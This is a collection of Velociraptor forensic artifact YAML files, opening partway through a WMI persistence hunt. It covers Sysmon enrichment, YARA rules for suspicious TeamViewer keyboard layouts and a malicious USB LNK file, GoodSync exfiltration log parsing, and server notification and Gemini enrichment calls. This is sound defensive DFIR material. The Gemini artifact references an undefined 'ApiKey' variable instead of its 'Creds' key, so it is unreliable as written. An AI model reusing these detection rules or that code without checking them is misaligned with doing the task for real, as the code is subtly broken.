                    query="SELECT * FROM __FilterToConsumerBinding",namespace=namespace)
        },workers=len(list=namespaces))
        WHERE Consumer.Type IN InterstingConsumerTypes.consumer_types

      LET FilterToConsumerBindingLookup <= SELECT * FROM foreach(
            row=namespaces,
            query={
                 SELECT {
                     SELECT * FROM wmi(
                       query="SELECT * FROM " + Consumer.Type, namespace=Consumer.namespace || namespace) 
                     WHERE Name = Consumer.Name AND NOT 
                       Name IN KnownGoodConsumers.consumer_name
                   } AS ConsumerDetails,
                   {
                     SELECT * FROM wmi(
                       query="SELECT * FROM " + Filter.Type, namespace=Filter.namespace || namespace) 
                     WHERE Name = Filter.Name AND NOT
                       Name IN KnownGoodFilters.filter_name
                   } AS FilterDetails,
                   namespace as Namespace
                 FROM FilterToConsumerBinding
                 WHERE (FilterDetails AND ConsumerDetails)
            },workers=len(list=namespaces))

      LET SuspiciousFilterToConsumerBindingLookup <= SELECT * FROM foreach(
        row=KnownBadKeywords,
        query={
          SELECT ConsumerDetails, FilterDetails 
          FROM FilterToConsumerBindingLookup
          WHERE lowcase(string=ConsumerDetails.CommandLineTemplate) =~ keyword OR 
            lowcase(string=ConsumerDetails.ScriptText) =~ keyword OR 
            ConsumerDetails.ScriptingEngine IN ScriptingEngines.scripting_engine
        }
      ) GROUP BY ConsumerDetails, FilterDetails

      SELECT * FROM foreach(
        row=KnownGoodKeywords,
        query={
          SELECT ConsumerDetails, FilterDetails 
          FROM SuspiciousFilterToConsumerBindingLookup
          WHERE NOT ConsumerDetails.CommandLineTemplate =~ keyword
        }
      ) GROUP BY ConsumerDetails, FilterDetails

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.EventLogs.SysmonProcessEnriched.yaml
======
name: Windows.EventLogs.SysmonProcessEnriched.yaml
author: "Zane Gittins"
description: |
   Gather sysmon process creation events from the sysmon operational event log. Enrich with authenticode signature of image and call chain.
   Caches authenticode signature by the hash of the image for an hour to reduce number of times it fetches the authenticode signature.
   Prerequisites: Sysmon, and the process tracker artifact.

# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT
type: CLIENT_EVENT

parameters:
  - name: ClearCacheSeconds
    default: 3600
    description: Clear cache at this interval of seconds.
    type: int64
  - name: TLSHImageRegex
    default: "AppData|Downloads|Desktop|Public|Temp"
    description: If an image matches this regex, calculate the TLSH hash.

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
       LET get_auth_cache(Image) = SELECT authenticode(filename=Image) AS Authenticode
         FROM scope()
       LET get_tlsh_cache(Image) = SELECT tlsh_hash(path=Image) AS TLSH
         FROM scope()
         WHERE Image =~ TLSHImageRegex
       SELECT *
       FROM delay(
         query={
           SELECT *,
                  cache(
                    period=ClearCacheSeconds,
                    func=get_auth_cache(
                      Image=EventData.Image),
                    key=str(
                      str=EventData.Hashes),
                    name="auth")[0].Authenticode AS Authenticode,
                  cache(
                    period=ClearCacheSeconds,
                    func=get_tlsh_cache(
                      Image=EventData.Image),
                    key=str(
                      str=EventData.Hashes),
                    name="tlsh")[0].TLSH AS TLSH,
                  join(
                    array=process_tracker_callchain(
                      id=EventData.ProcessId).Data.Name,
                    sep="->") AS CallChain
           FROM watch_evtx(
             filename="C:\\Windows\\system32\\winevt\\Logs\\Microsoft-Windows-Sysmon%4Operational.evtx")
           WHERE System.EventID.Value = 1
         },
         delay=1)

resources:
  max_rows: 1000

---END OF FILE---

======
FILE: /content/exchange/artifacts/TeamViewerLanguage.yaml
======
name: Windows.Detection.TeamViewerLanguage
author: Matt Green - @mgreen27
description: |
   This artifact enables collection of TeamViewer log entries for keyboard layout 
   changes.  
   
   The artifact firstly searches for TeamViewer log filenames, then applies yara 
   to extract log lines. The artifact by default hunts for Chinese, Vietnamese 
   and Russian language changes as priority, then uses a catch all for generic 
   changes. You can add additional targeted yara as desired to sort output.  
   
   In each log entry there are two language codes, the first being keyboard 
   layout of the connecting system and the second one the default input profile 
   of the target host. The same language codes could indicate legitimate support.
   
   Lookup Language codes at the Microsoft link for references. Examples below:  
   
   0409 - US English  
   0419 - Russian  
   0804 - Chinese Simplified  
   0404 - Chinese Traditional  
   042a - Vietnamese  
   
reference:
  - https://twitter.com/cyb3rops/status/1600157565148483584
  - https://github.com/Neo23x0/signature-base/blob/master/yara/log_teamviewer_keyboard_layouts.yar
  - https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/default-input-locales-for-windows-language-packs?view=windows-11
  
type: CLIENT

parameters:
   - name: TargetFileRegex
     default: ^TeamViewer.._Logfile.*\.log$
     description: target teamviewer log filenames.
   - name: DriveLetter
     default: "C:"
   - name: AllDrives
     type: bool
   - name: LayoutRegex
     default: .
     description: Regex of Layout to filter for
   - name: YaraToScan
     description: Yata to scan. High priority rules first then catch all for generic changes at end.
     default: |
        rule LOG_TeamViewer_Connect_Chinese_Keyboard_Layout {
           meta:
              description = "Detects a suspicious TeamViewer log entry stating that the remote systems had a Chinese keyboard layout"
              author = "Florian Roth"
              date = "2019-10-12"
              modified = "2020-12-16"
              score = 60
              limit = "Logscan"
              reference = "https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/default-input-locales-for-windows-language-packs"
           strings:
              /* Source has Chinese simplified keyboard layout */
              $x1 = "Changing keyboard layout to: 0804" ascii
              $x2 = "Changing keyboard layout to: 042a"
              /* Avoiding Chinese to Chinese support cases */
              $fp1 = "Changing keyboard layout to: 08040804" ascii
              $fp2 = "Changing keyboard layout to: 042a042a" ascii
           condition:
              ( #x1 + #x2 ) > ( #fp1 + #fp2 )
        }
        rule LOG_TeamViewer_Connect_Russian_Keyboard_Layout {
           meta:
              description = "Detects a suspicious TeamViewer log entry stating that the remote systems had a Russian keyboard layout"
              author = "Florian Roth"
              date = "2019-10-12"
              modified = "2022-12-07"
              score = 60
              limit = "Logscan"
              reference = "https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/default-input-locales-for-windows-language-packs"
           strings:
              /* Source has Russian keyboard layout */
              $x1 = "Changing keyboard layout to: 0419" ascii
              /* Avoiding Russian to Russian support cases */
              $fp1 = "Changing keyboard layout to: 04190419" ascii
           condition:
              #x1 > #fp1
        }
        rule LOG_TeamViewer_Connect_any_Keyboard_Layout {
           meta:
              description = "Detects a generic TeamViewer log entry stating change in keyboard layout"
           strings:
             $x1 = "Changing keyboard layout to:" ascii
            condition:
              any of them
        }


sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      LET hits = SELECT OSPath,Rule,
        Meta.description as RuleDescription,
        filter(list=split(string=HitContext,sep='\r\n'),regex='Changing keyboard layout to')[0] as HitContent
      FROM Artifact.Windows.Detection.Yara.NTFS(
            FileNameRegex=TargetFileRegex,PathRegex='.',
            AllDrives=AllDrives,
            DriveLetter=DriveLetter,
            NumberOfHits=9999999, 
            ContextBytes=50,
            YaraRule=YaraToScan )
      

      LET details = SELECT*,
            parse_string_with_regex(string=HitContent,
            regex=[
                '^(?P<EventTime>\\d{4}.\\d{2}.\\d{2}.\\d{2}:\\d{2}:\\d{2}[^\\s]+)',
                'Changing keyboard layout to: (?P<KeyboardLayout>[^\\s]+)']) as Details
      FROM hits

      SELECT
        timestamp(string=Details.EventTime) as EventTime,
        Rule,
        Details.KeyboardLayout as KeyboardLayout,
        HitContent, 
        RuleDescription,
        OSPath
      FROM details
      WHERE KeyboardLayout =~ LayoutRegex

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.System.BashLogout.yaml
======
name: Linux.System.BashLogout
description: |
   Capture Bash logout files for examination of abnormal activity. 
   
   Bash logout files are used to run certain commands upon user logout, such as clearing the shell or terminal state. An adversary could leverage this capability to clear logs, cover tracks, delete files, etc.

type: CLIENT

author: Wes Lambert - @therealwlambert|@weslambert@infosec.exchange

parameters:
- name: BashLogoutGlob
  default: /home/*/.bash_logout
- name: ContentFilter
  default: .
  description: Filter used for searching through file content
- name: UploadFiles
  default: False
  description: "Upload Bash logout files in scope"
  type: bool
precondition:
      SELECT OS From info() where OS = 'linux'

sources:
  - query: |
  
      LET BashLogoutList = SELECT OSPath, Mtime
       FROM glob(globs=split(string=BashLogoutGlob, sep=","))
       
      SELECT OSPath, Mtime, parse_string_with_regex(regex="(?sm)(?P<Commands>^[a-z].*)", string=read_file(filename=OSPath)).Commands AS Content, 
             if(condition=UploadFiles,then=upload(file=OSPath)) AS Upload
      FROM foreach(row=BashLogoutList)
      WHERE Content =~ ContentFilter

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Events.TrackProcesses.UseExistingSysmonOnly.yaml
======
name: Windows.Events.TrackProcesses.UseExistingSysmonOnly
description: |
  **This is a modified version of Windows.Events.TrackProcesses for servers
  that do not use the Inventory service.  It assumes that Sysmon
  is already installed and running. The option to forward updates to the server
  is also removed.**
  
  This artifact uses sysmon and pslist to keep track of running
  processes using the Velociraptor process tracker.

  The Process Tracker keeps track of exited processes, and resolves
  process callchains from it in memory cache.

  This event artifact enables the global process tracker and makes it
  possible to run many other artifacts that depend on the process
  tracker.

type: CLIENT_EVENT

parameters:
  - name: MaxSize
    type: int64
    description: Maximum size of the in memory process cache (default 10k)

  - name: AddEnrichments
    type: bool
    description: Add process information enrichments (can use more resources)

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      LET UpdateQuery =
            SELECT * FROM foreach(row={
              SELECT *,
                     get(member='EventData') AS EventData
              FROM watch_etw(guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}')
            }, query={
              SELECT * FROM switch(
              start={
                SELECT EventData.ProcessId AS id,
                       EventData.ParentProcessId AS parent_id,
                       "start" AS update_type,

                       -- We need to manually build the dict here so
                       -- we can maintain column ordering.
                       dict(
                           Pid=EventData.ProcessId,
                           Ppid=EventData.ParentProcessId,
                           Name=split(sep_string="\\", string=EventData.Image)[-1],
                           StartTime=EventData.UtcTime,
                           EndTime=NULL,
                           Username=EventData.User,
                           Exe=EventData.Image,
                           CommandLine= EventData.CommandLine,
                           CurrentDirectory= EventData.CurrentDirectory,
                           FileVersion=EventData.FileVersion,
                           Description= EventData.Description,
                           Company= EventData.Company,
                           Product= EventData.Product,
                           ParentImage= EventData.ParentImage,
                           ParentCommandLine= EventData.ParentCommandLine,
                           TerminalSessionId= EventData.TerminalSessionId,
                           IntegrityLevel= EventData.IntegrityLevel,
                           Hashes=parse_string_with_regex(regex=[
                             "SHA256=(?P<SHA256>[^,]+)",
                             "MD5=(?P<MD5>[^,]+)",
                             "IMPHASH=(?P<IMPHASH>[^,]+)"],
                           string=EventData.Hashes)
                       ) AS data,
                       EventData.UtcTime AS start_time,
                       NULL AS end_time
                FROM scope()
                WHERE System.ID = 1
              },
              end={
                SELECT EventData.ProcessId AS id,
                       NULL AS parent_id,
                       "exit" AS update_type,
                       dict() AS data,
                       NULL AS start_time,
                       EventData.UtcTime AS end_time
                FROM scope()
                WHERE System.ID = 5
              })
            })

      LET SyncQuery =
              SELECT Pid AS id,
                 Ppid AS parent_id,
                 CreateTime AS start_time,
                 dict(
                   Name=Name,
                   Username=Username,
                   Exe=Exe,
                   CommandLine=CommandLine) AS data
              FROM pslist()

      LET Tracker <= process_tracker(
         enrichments=if(condition=AddEnrichments, then=[
           '''x=>if(
                condition=NOT x.Data.VersionInformation AND x.Data.Image,
                then=dict(VersionInformation=parse_pe(file=x.Data.Image).VersionInformation))
           ''',
           '''x=>if(
                condition=NOT x.Data.OriginalFilename OR x.Data.OriginalFilename = '-',
                then=dict(OriginalFilename=x.Data.VersionInformation.OriginalFilename))
           '''], else=[]),
        sync_query=SyncQuery, update_query=UpdateQuery, sync_period=60000)

      SELECT * FROM process_tracker_updates()
      WHERE update_type = "stats"

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Registry.Bulk.ComputerName.yaml
======
name: Windows.Registry.Bulk.ComputerName
description: |
  This looks through registry on all disks to determine the hostname for cases where multiple disks are mounted
author: Angry-bender

precondition: SELECT OS From info() where OS = 'windows'

parameters:
  - name: TargetDrive
    description: |
      The path to to the drive that holds the SYSTEM registry hive. 
    default: "C:"
  - name: HiveLocation
    default: '\\windows\\system32\\config\\system'
    description: "Loction of target hive"
  - name: KeyValue
    default: "/*/Control/ComputerName/ComputerName/ComputerName"
    description: "Loction of target key"
  - name: AllDrives
    description: Search all drives?
    type: bool
    default: Y

sources:
 - query: |
    LET Drive <= pathspec(parse=TargetDrive, path_type="ntfs")
    
    -- get all drives
    LET ntfs_drives = SELECT
    OSPath AS Drive,
    OSPath + HiveLocation AS SystemHive
    FROM glob(globs="/*", accessor="ntfs")
    WHERE log(message="Processing " + SystemHive)
    
    LET RegParse(Drive,SysHivePth) = 
    SELECT Drive, Name, FullPath, url(parse=FullPath).Fragment AS Value, Mtime, Data.value AS Key FROM foreach(
            row={
                SELECT * FROM Drive
            },
            query={
                SELECT *
                FROM glob(
                globs=url(scheme="file",
                path=SysHivePth,
                fragment=KeyValue),
                accessor="raw_reg")
            })

    SELECT * FROM if(condition=AllDrives,
        then={
             SELECT * FROM foreach(
                row={
                    SELECT * FROM ntfs_drives
                },
                query={
                    SELECT *
                    FROM RegParse(
                        Drive=Drive,
                        SysHivePth=SystemHive)
                })
        },
        else={
            SELECT *
            FROM RegParse(
                Drive=Drive,
                SysHivePth = Drive + HiveLocation)
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Forensics.Jumplists_JLECmd.yaml
======
name: Windows.Forensics.Jumplists_JLECmd
description: |
    * Execute Eric Zimmerman's JLECmd to parse AUTOMATICDESTINATIONS-MS and CUSTOMDESTINATIONS-MS files in C:\ drive recursively and return output for analysis. (jlecmd.exe -d C:/ --csvf -csv tmpdir results.csv).
    * JLECmd.zip is downloaded from the URL to 'C:\Program Files\Velociraptor\Tools' folder.
    * JLECmd.zip can be uploaded to Velociraptor Server in order to copy it to the clients in case there is no internet connection.
    * Created using @carlos_cajigas LECmd VQL as a quide.
    * JLECmd is a CLI tool for analyzing Custom Destinations jump list data. Learn more - https://github.com/EricZimmerman/JLECmd

author: Orhan Emre @orhan_emre

type: CLIENT

tools:
  - name: JLECmd
    url: https://download.mikestammer.com/net6/JLECmd.zip
    version: 1.5.0


parameters:
  - name: sourceFile
    default: .
    type: regex
    description: "RegEx pattern for the name or path of the Automatic and Custom Destinations jump list files. Example 'recent' folder"
  - name: localPath
    default: .
    type: regex
    description: "RegEx pattern for the name or path of the target of the Automatic and Custom Destinations jump list files. Example 'powershell_ise.exe'"
  - name: arguments
    default: .
    type: regex
    description: "Arguments of the Automatic and Custom Destinations jump list files. Example '/c powershell Invoke-Command'"
  - name: dateAfter
    description: "search for Automatic and Custom Destinations jump list files with a SourceCreated after this date. YYYY-MM-DD"
  - name: dateBefore
    description: "search for Automatic and Custom Destinations jump list files with a SourceCreated before this date. YYYY-MM-DD"

precondition: SELECT OS From info() where OS = 'windows'

sources:
  - query: |
      -- get context on target binary
      LET jlecmdpackage <= SELECT * FROM Artifact.Generic.Utils.FetchBinary(
                    ToolName="JLECmd", IsExecutable=FALSE)

      -- build tempfolder for output
      LET tmpdir <= tempdir()

      -- decompress utility
      LET payload = SELECT *
        FROM unzip(filename=jlecmdpackage[0].FullPath,
            output_directory=tmpdir) WHERE OriginalPath =~ "JLECmd.exe"

      -- execute payload
      LET deploy <= SELECT *
        FROM execve(argv=[payload.NewPath[0],
        "-d",
        "c:/",
        "--csv",
        tmpdir,
        "--csvf",
        "results.csv"])

      LET x = scope()

      SELECT * FROM foreach(row={
          SELECT OSPath, upload(file=OSPath)
          FROM glob(globs="results_*.csv", root=tmpdir)
      }, query={
          SELECT x.SourceFile AS SourceFile,
             x.SourceCreated AS SourceCreated,
             x.SourceModified AS SourceModified,
             x.LocalPath AS LocalPath,
             x.Arguments AS Arguments,
             x.TargetCreated AS TargetCreated,
             x.TargetModified AS TargetModified,
             x.VolumeLabel AS VolumeLabel,
             x.DriveType AS DriveType,
             x.AppIdDescription AS AppIdDescription,
             x.CommonPath AS CommonPath,
             x.VolumeSerialNumber AS VolumeSerialNumber,
             x.MachineID AS MachineID,
             x.MachineMACAddress AS MachineMACAddress,
             x.TargetMFTEntryNumber AS TargetMFTEntryNumber,
             x.TargetSequenceNumber AS TargetSequenceNumber,
             x.TargetIDAbsolutePath AS TargetIDAbsolutePath,
             x.TrackerCreatedOn AS TrackerCreatedOn,
             x.ExtraBlocksPresent AS ExtraBlocksPresent,
             x.HeaderFlags AS HeaderFlags,
             x.FileAttributes AS FileAttributes,
             x.FileSize AS FileSize
         FROM parse_csv(filename=OSPath)
         WHERE
           (if(condition=dateAfter, then=SourceCreated > dateAfter,
             else=TRUE) AND
           if(condition=dateBefore, then=SourceCreated < dateBefore,
             else=TRUE))
         AND SourceFile =~ sourceFile
         AND LocalPath =~ localPath
         AND Arguments =~ arguments
      })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Generic.Events.TrackNetworkConnections.yaml
======
name: Generic.Events.TrackNetworkConnections
author: Herbert Bärschneider @SEC Consult
description: |
   This artifact is meant for monitoring network connections on clients.
   It periodically queries the existing network connections and emits lines for differences (new connections and missing/removed ones).
   Network connections are tracked and compared based on following elements: process id, layer 3 protocol, layer 4 protocol, local address used, local port used, remote address used, remote port used.
   
   The network connection information is enriched with process information to make it easier to analyze emited lines.

type: CLIENT_EVENT

parameters:
   - name: Period
     default: 2
     type: int
     description: how many seconds the artifact waits between checking network connections for changes

sources:
    - query: |
        LET NetworkConnections = SELECT *, format(format="%v %v %v %v %v %v %v", args=[Pid, Family, Type, Laddr.IP, Laddr.Port, Raddr.IP, Raddr.Port]) AS DiffKey FROM netstat()
      
        LET EventQuery = SELECT * FROM diff(query=NetworkConnections, period=Period, key="DiffKey")
      
        SELECT *, process_tracker_get(id=Pid) AS ProcInfo FROM EventQuery

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Registry.CapabilityAccessManager.yaml
======
name: Windows.Registry.CapabilityAccessManager
description: |
    The ConsentStore in CapabilityAccessManager can provide insight to
    what resources binaries have had access to, such as the microphone
    and webcam. This artefact returns non-Microsoft executables (ie:
    entries listed in the `NonPackaged` path).

    Additional Resources:

    * https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072
    * https://thinkdfir.com/2022/01/04/i-can-see-and-hear-you-seeing-and-hearing-me/

    Tags: #windows #registry

author: Zach Stanford - @svch0st, Phill Moore - @phillmoore
type: CLIENT

parameters:
  - name: KeyList
    description: List of reg locations and descriptions
    type: csv
    default: |
        Glob,Description
        HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\*\NonPackaged\*, SoftwareHive
        HKEY_USERS\*\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\*\NonPackaged\*, UserHive
sources:
    - queries:
        - |

            SELECT * FROM foreach(
                row=KeyList,
                query={
                    SELECT Description as SourceLocation,
                        path_split(path=FullPath)[-3] as Accessed,
                        regex_replace(source=basename(path=FullPath), re="#", replace="/") as Program,
                        {SELECT timestamp(winfiletime=atoi(string=Data.value)) FROM glob(globs=FullPath+'\\LastUsedTimeStart', accessor="reg")} as LastUsedTimeStart,
                        {SELECT timestamp(winfiletime=atoi(string=Data.value)) FROM glob(globs=FullPath+'\\LastUsedTimeStop', accessor="reg")} as LastUsedTimeStop,
                        dirname(path=FullPath) as KeyPath
                    FROM glob(globs=Glob, accessor="reg")
                    Where NOT Program = "Value"
                }
            )

---END OF FILE---

======
FILE: /content/exchange/artifacts/USBYara.yaml
======
name: Windows.Detection.USBYara
author: Matt Green - @mgreen27
description: |
  Run yara over usb when USB is plugged into machine.  Return context
  and hit details.

  This artifact requires:

    * Exchange.Windows.Monitor.USBPlugIn (imported from Exchange)
    * Generic.Detection.Yara.Glob

  Yara rule deployed and target path can be modified.

type: CLIENT_EVENT

parameters:
  - name: TargetGlob
    default: '/**.lnk'
  - name: PayloadYara
    default: |
            rule recyclebin_lnk{
                meta:
                    description = "AvastSvcpCP lnkfile"
                    author = "@mgreen27"
                    date = "2021-11-18"

                strings:
                    $s1 = "AvastSvcpCP" wide nocase
                    $s2 = "cefhelper.exe" wide nocase
                    $s3 = "RECYCLER.BIN" wide nocase
                    $s4 = "wsc.zip" wide nocase
                    $s6 = "/q /c" wide nocase
                    $s8 = "S-1-5-21-1063499884-3365855816-3691837489-1000" wide nocase
                    $s9 = "Xayemarlwin-pc" wide nocase

               condition:
                    int16(0) == 0x004c and any of them
            }

sources:
  - query: |
      SELECT * FROM foreach(
            row={ SELECT DriveName,TimeCreated FROM Artifact.Exchange.Windows.Monitor.USBPlugIn() },
            query={
                SELECT
                    TimeCreated as EventTime,
                    { SELECT Fqdn from info() } as Hostname,
                    FullPath,Size,
                    dict(Mtime=Mtime,Atime=Atime,Ctime=Ctime,Btime=Btime) as SITimestamps,
                    Rule,Meta,
                    HitContext,HitOffset,
                    {
                        SELECT Name, FileSystem,Description,FreeSpace,Size,VolumeSerialNumber,VolumeName
                        FROM wmi(query='SELECT * FROM Win32_logicaldisk WHERE DeviceID = "' + DriveName + '"',namespace='ROOT/CIMV2')
                    } as DiskInfo
                FROM Artifact.Generic.Detection.Yara.Glob(PathGlob=DriveName + TargetGlob,YaraRule=PayloadYara)
            })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Notification.Mastodon.yaml
======
name: Server.Notification.Mastodon
author: Wes Lambert -- @therealwlambert
description: |
  Create a post on a Mastodon server. This could be used for automated alerting purposes, sharing IOCs, etc.

  This artifact can be called from within another artifact to include data from the artifact results in the message/status.
  
  This could also be turned into a server event artifact to send a notification or post to Mastodon when a particular event occurs.

  Ex.

    `SELECT * from Artifact.Server.Notification.Mastodon(Status=YourMessage/Status)`

type: SERVER

parameters:
    - name: Status
      type: string
      description: The message/status to be posted to Mastodon.
      default:
    
    - name: MastodonServer
      type: string
      description: Mastodon server. Leave blank here if using server metadata store.
      default:

    - name: MastodonToken
      type: string
      description: Token for Mastodon. Leave blank here if using server metadata store.
      default:

sources:
  - query: |
        LET Creds <= if(
            condition=MastodonToken,
            then=MastodonToken,
            else=server_metadata().MastodonToken)
        
        LET Server <= if(
            condition=MastodonServer,
            then=MastodonServer,
            else=server_metadata().MastodonServer)

        SELECT * FROM http_client(
            url='https://'+ Server +'/api/v1/statuses',
            headers=dict(`Authorization`='Bearer ' + Creds, `Content-Type`="application/json"),
            method="POST",
            data=dict(`status`=Status)
        )

---END OF FILE---

======
FILE: /content/exchange/artifacts/Gemini.yaml
======
name: Server.Enrichment.AI.Gemini
author: Matt Green - @mgreen27
description: |
  Query Gemini AI for analysis of data.
  
  Paramaters:
  
  * `PrePrompt` - Added as preprompt. Default is: 
  "You are a Cyber Incident Responder and need to analyze data. You have an eye 
  for detail and like to use short precise technical language. Analyze the 
  following data and provide summary analysis:"
  * `Prompt` - Is User prompt as string: When pushing a dict object via 
  PromtData good practice is add some strings related to the type of data for 
  analysis or artifact name to provide context.
  * `PromptData` - add optional object to be serialized and added to the User prompt.
  * `Model` - Model to use for your request. Default is gemini-2.0-flash
  * `MaxTokens` - Set max token size  default 64000
  
  This artifact can be called from within another artifact (such as one looking 
  for files) to enrich the data made available by that artifact.
  
  e.g
  
  `LET results = SELECT Category, Signer,ImagePath,LaunchString FROM source(artifact="Windows.Sysinternals.Autoruns")`  
  `SELECT * FROM Artifact.Server.Enrichment.AI.Gemini(Prompt="Review Autoruns data:",PromptData=results)`
  
type: SERVER

parameters:
    - name: PrePrompt
      type: string
      description: |
        Prompt to send with data. For example, when asking 
        a question, then providing data separately
      default: |
        You are a Cyber Incident responder and need to analyse forensic 
        collections. You have an eye for detail and like to use short precise 
        technical language. Your PRIMARY goal is to analyse the following data 
        and provide summary analysis:
    - name: Prompt
      type: string
      default: what is prefetch?
    - name: PromptData
      type: string
      description: The data sent to Google - this data is serialised and added to the prompt
    - name: Model
      type: string
      description: The model used for processing the prompt
      default: gemini-2.0-flash
    - name: GeminiApiKey
      type: string
      description: Token for Gemini. Leave blank here if using server metadata store.
    - name: MaxTokens
      type: int
      default: 64000

sources:
  - query: |
        LET Creds <= if(
            condition=GeminiApiKey,
            then=GeminiApiKey,
            else=server_metadata().GeminiApiKey)
        LET parts = if(condition=PromptData,
                        then= dict(text=PrePrompt + Prompt + serialize(item=PromptData)),
                        else= dict(text=PrePrompt + Prompt)
                    )
        LET Data = dict(contents=dict(parts=[parts,]))

        SELECT
            parts.text as UserPrompt,
            parse_json(data=Content).candidates[0].content.parts[0].text AS ResponseText,
            parse_json(data=Content) AS ResponseDetails
        FROM http_client(
            url='https://generativelanguage.googleapis.com/v1beta/models/' + Model + ':generateContent?key=' + ApiKey,
            headers=dict(`Content-Type`="application/json"),
            method="POST",
            data=Data
        )

column_types:
  - name: ResponseText
    type: nobreak

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Applications.GoodSync.yaml
======
name: Windows.Applications.GoodSync
author: Nathanaël Ndong, Synacktiv
description: |
   This artefact can be used to retrieve and parse some GoodSync file in order to
   - identify configured Good Sync account;
   - identify data and time of transfered files.
   
   This artifact have been created to identify potential exfiltrated files using GoodSync tool.
   You can read more about it on https://www.synacktiv.com/publications/legitimate-exfiltration-tools-summary-and-detection-for-incident-response-and-threat

type: CLIENT
parameters:
    - name: FileGlob
      default: C:\Users\*\AppData\Local\GoodSync\GoodSync-*

sources:
    - name: sync files
      query: |

        -- Grabs file path of provided file glob
        LET InputLogPath <= SELECT FullPath 
        FROM glob(globs=FileGlob)

        -- Parses file against regex
        LET parse_log <= SELECT
            parse_string_with_regex(
                string=Line,
                regex= '''^(?P<Date>\d{4}-\d{2}-\d{2}\s\d{2}:\d{2}:\d{2})\s''' + 
                       '''#\d+\s'''+
                       '''(?P<Message>.+?)$''')
                       as Record
                       FROM parse_lines(filename=InputLogPath.FullPath)
                    
        --SELECT * FROM parse_log WHERE Record.Message =~ "Copy New"
        -- Prints matching data where there is an entry in Record.Message  
        LET extract_files(message) =
        parse_string_with_regex(string=message,
            regex=
            '''^(?P<Protocol>\[.+?\])\s''' +
            '''.?''' +
            '''\s?(?P<Operation>Copy\sNew)\s''' +
            '''\'(?P<Source>.+?)\'\s''' +
            '''.+?\s''' +
            '''\'(?P<Destination>.+?)\'\s''' +
            '''\((?P<Byte>.+?)\)'''
            )
        SELECT Record.Date as Date, 
            extract_files(message=Record.Message).Protocol AS Protocol,
            extract_files(message=Record.Message).Operation AS Operation,
            extract_files(message=Record.Message).Source AS Source,
            extract_files(message=Record.Message).Destination AS Destination,
            extract_files(message=Record.Message).Size AS Size
        FROM parse_log
        WHERE Record.Message =~ "Copy New"
 
    - name: good_sync_account
      query: |
      
        LET InputLogPath <= SELECT FullPath 
        FROM glob(globs=FileGlob)

        LET parse_log <= SELECT
            parse_string_with_regex(
                string=Line,
                regex= '''^(?P<Date>\d{4}-\d{2}-\d{2}\s\d{2}:\d{2}:\d{2})\s''' + 
                       '''#\d+\s'''+
                       '''(?P<Message>.+?)$''')
                       as Record
                       FROM parse_lines(filename=InputLogPath.FullPath)
    
        LET extract_user(message)= parse_string_with_regex(string=message,
            regex='''.+?\s.+?\s.+?\s''' +
            '''UserId=''' +
            '''(?P<UserId>.+?)\s''' +
            '''m_bLicActive=''' +
            '''(?P<Nb_licence>.+?)\s''' +
            '''.+?''' +
            '''(?P<Date_expiration>\d{4}-\d{2}-\d{2}\s\d{2}:\d{2}:\d{2})\s'''+
            '''.+?\s.+?\s.+?''' +
            '''(?P<Date_creation>\d{4}-\d{2}-\d{2}\s\d{2}:\d{2}:\d{2})\s'''
        )   

        --SELECT * FROM parse_log WHERE Record.Message =~ "CheckLicenseViaGsAccount:"  
        SELECT Record.Date as Date,
            extract_user(message=Record.Message).UserId AS GoodSync_Account,
            extract_user(message=Record.Message).Nb_licence AS Active_Licence,
            extract_user(message=Record.Message).Date_expiration AS Licence_Expiration,
            extract_user(message=Record.Message).Date_creation AS Account_Creation
        FROM parse_log
        WHERE Record.Message =~ "CheckLicenseViaGsAccount:"  
        

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Network.LittleSnitch.yaml
======
name: MacOS.Network.LittleSnitch
author: Wes Lambert -- @therealwlambert
description: |
   This is artifact parses Little Snitch's network traffic log.
   
   More information about Little Snitch can be found here:
   https://www.obdev.at/products/littlesnitch/index.html

# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT
type: CLIENT

parameters:
   - name: CSVGlob
     default:
   - name: ExecutableRegex
     description: "Filter on executable name"
     default: .
     type: regex
   - name: IPRegex
     description: "Filter on IP address"
     default: .
     type: regex
   - name: ParentRegex
     description: "Filter on parent exectuable"
     default: .
     type: regex
   - name: RemoteHostnameRegex
     description: "Filter on IP remote hostname"
     default: .
     type: regex
     
sources:

  - precondition:
      SELECT OS From info() where OS = 'windows' OR OS = 'linux' OR OS = 'darwin'

    query: |
      LET LittleSnitchLogs <= SELECT FullPath FROM glob(globs=CSVGlob)
      LET ProtocolTable <= SELECT * from parse_csv(accessor="data", filename='''
        Number,ProtocolName
        1,ICMP
        6,TCP
        17,UDP
        ''')
      SELECT * FROM foreach(row={ 
        SELECT
            timestamp(string=date) AS Time,
            direction AS Direction,
            uid AS UID,
            ipAddress AS `IP Address`,
            remoteHostname AS `Remote Hostname`,
            if(condition=ProtocolTable.ProtocolName[0], then=ProtocolTable.ProtocolName[0], else=protocol) AS Protocol,
            port AS Port,
            connectCount AS `Connect Count`,
            denyCount AS `Deny Count`,
            byteCountIn AS `Bytes In`,
            byteCountOut AS `Bytes Out`,
            connectingExecutable AS `Executable`,
            parentAppExecutable AS `Parent`
        FROM parse_csv(filename=LittleSnitchLogs.FullPath)})

---END OF FILE---

======
FILE: /content/exchange/artifacts/VscodeTasks.yaml
======
